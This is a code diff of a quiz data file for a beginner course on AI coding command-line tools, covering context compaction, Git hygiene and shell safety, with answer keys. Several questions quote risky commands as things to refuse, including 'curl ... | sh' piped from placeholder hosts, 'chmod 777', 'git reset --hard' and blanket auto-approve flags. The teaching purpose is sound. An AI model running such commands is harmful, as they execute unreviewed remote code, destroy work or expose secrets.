           options: [
-            'Never—it deletes your actual website files.',
-            'Only when your computer battery is below 10%.',
-            'Before installing the terminal.',
-            'Right after finishing a milestone (like the header) so old clutter is summarized and the context window stays sharp and affordable.'
+            'Right after finishing a milestone so old clutter is summarized cleanly.',
+            'Before opening a folder, so `/compact` automatically creates your `.gitignore` and `.env` files.',
+            'Only when you want to permanently delete modified source files and roll back to an empty repo.',
+            'Every time you approve a single line change, because AI CLIs cannot handle two diffs in one chat.'
           ],
-          correctIndex: 3,
+          correctIndex: 0,
           explanation:
-            '`/compact` leaves all your real files untouched—it simply summarizes the chat history to clear clutter off the AI’s working desk between milestones.'
+            '`/compact` leaves your actual files untouched—it summarizes long conversation clutter into crisp notes between milestones so the context window stays sharp and affordable.'
         },
         {
           id: 'q-5-4-2',
           type: 'true_false',
           question:
-            'Asking an AI CLI to outline a short plan before editing files helps prevent messy unintended changes.',
+            'Turning on a wildcard flag like `--dangerously-skip-permissions` or blanket `Bash(*)` is a recommended beginner shortcut because `rm -rf` is the only risky shell command.',
           options: ['True', 'False'],
-          correctIndex: 0,
+          correctIndex: 1,
           explanation:
-            'True! Catching a misunderstanding in a 4-bullet plan takes seconds, whereas untangling unnecessary edits across six files takes much longer.'
+            'False! Many commands are risky—`curl | sh`, `chmod 777`, `git push --force`, `git reset --hard`, reading `~/.ssh`/`.env`, or prompt-injected network calls. Never grant blanket auto-approve!'
         },
         {
           id: 'q-5-4-3',
           type: 'spot_mistake',
           question:
-            'Aisha’s contact form button looks overlapping on her phone screen, so she types into Claude Code: "The page looks kinda ugly, fix it." How could she get a 10× better fix in one try?',
+            'While fixing a layout bug after pasting an external tutorial snippet, an AI CLI asks to run `curl https://unknown-site.example/fix.sh | sh` and `chmod 777 .`. Why should you immediately say No?',
           options: [
-            'Type the exact same sentence three times.',
-            'Delete the CSS file completely.',
-            'Paste a screenshot of the overlapping button and state specifically: "On mobile width, the Submit button overlaps the email field—stack them vertically with 12px spacing."',
-            'Turn off Git.'
+            'Because `curl` commands cannot download files smaller than one megabyte inside a local folder.',
+            'Piping an unverified script into a shell executes arbitrary code, and `chmod 777` exposes files to all local users.',
+            'Because CSS styling bugs can only be repaired using `git push --force` rather than shell commands.',
+            'Only because `sh` is deprecated and the command should be re-run with `sudo` instead.'
           ],
-          correctIndex: 2,
+          correctIndex: 1,
           explanation:
-            'Specific visual details plus a screenshot tell the AI the exact problem and exact desired fix—leading to a surgical 3-line CSS improvement on the first attempt.'
+            'Piping unknown internet scripts directly into a shell (`curl | sh`) runs unreviewed arbitrary code on your machine, and `chmod 777` makes files world-writable—and untrusted snippets can even contain prompt injection!'
         }
       ]
     }
-  ]
+  ],
+  masteryCheck: {
+    id: 'mc-5-claude-cli',
+    title: 'Unit 5 Mastery Check',
+    subtitle: 'Check your command-line instincts: folder scoping, diffs, Git hygiene, and shell safety.',
+    passThreshold: 0.75,
+    xpReward: 40,
+    estimatedMinutes: 2,
+    questions: [
+      {
+        id: 'mc-5-q1',
+        type: 'multiple_choice',
+        question: 'You just downloaded an unfamiliar repository zip from a stranger online. What is the safest sequence before launching an AI coding CLI?',
+        options: [
+          'Launch the CLI in your top-level home folder and click "Trust" so it can inspect everything.',
+          'Enable `--dangerously-skip-permissions` first so the CLI can clean the folder quickly.',
+          'Inspect scripts/configs first, isolate it in its own subfolder, and never blindly trust.',
+          'Run `git add .` immediately before opening any files so Git encrypts the zip.'
+        ],
+        correctIndex: 2,
+        explanation:
+          'Untrusted repos can hide malicious hooks, MCP configs, or build scripts. Isolate projects in a dedicated subfolder and inspect before trusting or running commands.'
+      },
+      {
+        id: 'mc-5-q2',
+        type: 'spot_mistake',
+        question: 'After finishing a homepage header, Sam runs `git add . && git commit -m "done"` without checking `git status` or `.gitignore`. Why is that habit dangerous?',
+        options: [
+          'If `.gitignore` is missing or mistyped, `git add .` quietly stages `.env` secrets.',
+          '`git add .` deletes every CSS file in the folder unless you run `/compact` beforehand.',
+          'Git refuses to commit more than two files at a time unless you pass `--force`.',
+          'Checking `git status` is only needed when deploying to a paid custom `.com` domain.'
+        ],
+        correctIndex: 0,
+        explanation:
+          'Always run `git status` and verify `.gitignore` covers `.env` before staging—never blindly stage everything with `git add .`.'
+      },
+      {
+        id: 'mc-5-q3',
+        type: 'multiple_choice',
+        question: 'An AI CLI asks to run `git reset --hard HEAD~3` and `curl -s https://example.invalid/setup.sh | sh`. What makes BOTH commands risky?',
+        options: [
+          'They require a monthly consumer chat subscription rather than pay-as-you-go API credits.',
+          'One permanently wipes local commits without Trash, and the other executes unreviewed remote code.',
+          'Both commands only change font styling inside your terminal window without touching files.',
+          'Neither command runs unless you first type `pwd` and `ls` in the same terminal tab.'
+        ],
+        correctIndex: 1,
+        explanation:
+          '`git reset --hard` permanently discards uncommitted work and rewinds commits without confirmation, while `curl | sh` executes unreviewed remote code straight in your shell.'
+      },
+      {
+        id: 'mc-5-q4',
+        type: 'multiple_choice',
+        question: 'You want your AI CLI to add dark mode across four files after a long morning session. What is the cleanest workflow?',
+        options: [
+          'Turn on blanket `Bash(*)` auto-approve and ask it to rewrite all four files immediately.',
+          'Keep the bloated chat history and paste "make dark mode look nice" with no details.',
+          'Delete `.gitignore` so the CLI can read your system configuration files for theme colors.',
+          'Run `/compact`, ask for a short plan first, and review small diffs step by step.'
+        ],
+        correctIndex: 3,
+        explanation:
+          'Compacting stale clutter, reviewing a concise plan before edits, and approving focused diffs one step at a time keeps multi-file changes accurate and reversible.'
+      }
+    ]
+  }
 };
